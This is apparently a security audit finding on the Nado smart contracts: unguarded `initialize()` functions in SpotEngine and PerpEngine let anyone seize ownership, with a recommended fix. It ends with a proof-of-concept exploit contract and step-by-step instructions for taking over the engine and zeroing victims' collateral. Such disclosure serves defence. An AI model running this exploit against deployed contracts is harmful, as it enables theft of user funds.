### Title
Unprotected `initialize()` in `SpotEngine` and `PerpEngine` Allows Anyone to Re-Initialize and Seize Ownership — (File: `core/contracts/SpotEngine.sol`, `core/contracts/PerpEngine.sol`)

---

### Summary

`SpotEngine.initialize()` and `PerpEngine.initialize()` are declared `external` but lack the `initializer` modifier from OpenZeppelin's `Initializable`. Because the `initializer` guard is never set, any external caller can invoke these functions after deployment, resetting the owner, endpoint, clearinghouse, and `canApplyDeltas` authorization map to attacker-controlled values.

---

### Finding Description

Every other upgradeable contract in the Nado system — `Endpoint`, `Clearinghouse`, `OffchainExchange`, `BaseProxyManager`, `ContractOwner` — uses the `initializer` modifier to prevent re-initialization:

```solidity
// Endpoint.sol:38
function initialize(...) external initializer { ... }

// Clearinghouse.sol:31
function initialize(...) external initializer { ... }

// OffchainExchange.sol:245
function initialize(...) external initializer { ... }
```

`SpotEngine` and `PerpEngine` do not:

```solidity
// SpotEngine.sol:14-20
function initialize(
    address _clearinghouse,
    address _offchainExchange,
    address _quote,
    address _endpoint,
    address _admin
) external {                          // ← no `initializer` modifier
    _initialize(_clearinghouse, _offchainExchange, _endpoint, _admin);
    ...
}
```

```solidity
// PerpEngine.sol:14-22
function initialize(
    address _clearinghouse,
    address _offchainExchange,
    address,
    address _endpoint,
    address _admin
) external {                          // ← no `initializer` modifier
    _initialize(_clearinghouse, _offchainExchange, _endpoint, _admin);
}
```

`_initialize` (in `BaseEngine`) calls `__Ownable_init()`, which unconditionally sets `_owner = msg.sender`, and then calls `setEndpoint(_endpoint)` (which is `internal onlyOwner` in `EndpointGated`). Because `__Ownable_init()` runs first and sets the owner to the caller, the `onlyOwner` guard on `setEndpoint` is satisfied by the attacker's own address. The result is a complete reset of all critical engine state. [1](#0-0) [2](#0-1) [3](#0-2) 

---

### Impact Explanation

After a successful re-initialization call, the attacker:

1. **Becomes owner** of `SpotEngine` / `PerpEngine` — all `onlyOwner` functions (`addOrUpdateProduct`, risk-weight updates, etc.) are now under attacker control.
2. **Replaces the endpoint** — `onlyEndpoint` guards in both engines now accept the attacker's address, allowing arbitrary balance mutations without going through the sequencer.
3. **Replaces the clearinghouse** — all calls that route through `_clearinghouse` (health checks, liquidation callbacks) are redirected to an attacker contract.
4. **Grants `canApplyDeltas`** to an attacker-controlled `offchainExchange` — the attacker can call `updateBalance` directly on any subaccount, stealing or zeroing collateral balances.

Concrete corrupted state: subaccount balances, risk weights, product configurations, and the `endpoint` / `clearinghouse` pointers inside both engine contracts. [4](#0-3) [5](#0-4) 

---

### Likelihood Explanation

The entry point is a plain `external` function with no access control and no one-time guard. Any EOA or contract can call it at any time after deployment. No privileged position, leaked key, or social engineering is required. The only prerequisite is knowing the deployed address of `SpotEngine` or `PerpEngine`, which is publicly readable from `Clearinghouse.getEngineByType()`. [6](#0-5) 

---

### Recommendation

Add the `initializer` modifier to both functions, matching every other upgradeable contract in the system:

```solidity
// SpotEngine.sol
function initialize(
    address _clearinghouse,
    address _offchainExchange,
    address _quote,
    address _endpoint,
    address _admin
) external initializer {   // ← add initializer
    ...
}

// PerpEngine.sol
function initialize(
    address _clearinghouse,
    address _offchainExchange,
    address,
    address _endpoint,
    address _admin
) external initializer {   // ← add initializer
    ...
}
```

Additionally, add `constructor() { _disableInitializers(); }` to both contracts (as `BaseProxyManager` and `ContractOwner` already do) to protect the bare implementation contract from being initialized directly. [7](#0-6) [8](#0-7) 

---

### Proof of Concept

```solidity
// Attacker contract
contract Exploit {
    function attack(address spotEngine) external {
        // Clearinghouse exposes engine addresses publicly
        // No permission needed — initialize() has no guard
        SpotEngine(spotEngine).initialize(
            address(this),   // malicious clearinghouse
            address(this),   // malicious offchainExchange → canApplyDeltas[this] = true
            address(fakeToken),
            address(this),   // malicious endpoint
            address(this)    // admin
        );
        // Attacker is now owner of SpotEngine
        // Attacker's address passes onlyEndpoint checks
        // Attacker can call updateBalance on any subaccount
    }
}
```

Step-by-step:
1. Read `spotEngineAddress = Clearinghouse.getEngineByType(SPOT)`.
2. Call `SpotEngine(spotEngineAddress).initialize(attacker, attacker, fakeToken, attacker, attacker)`.
3. `__Ownable_init()` sets `owner = attacker`.
4. `setEndpoint(attacker)` sets `endpoint = attacker` (passes `onlyOwner` because owner was just set to attacker).
5. `canApplyDeltas[attacker] = true`.
6. Attacker calls `SpotEngine.updateBalance(productId, victimSubaccount, -victimBalance, 0)` directly, zeroing victim collateral. [9](#0-8) [2](#0-1)
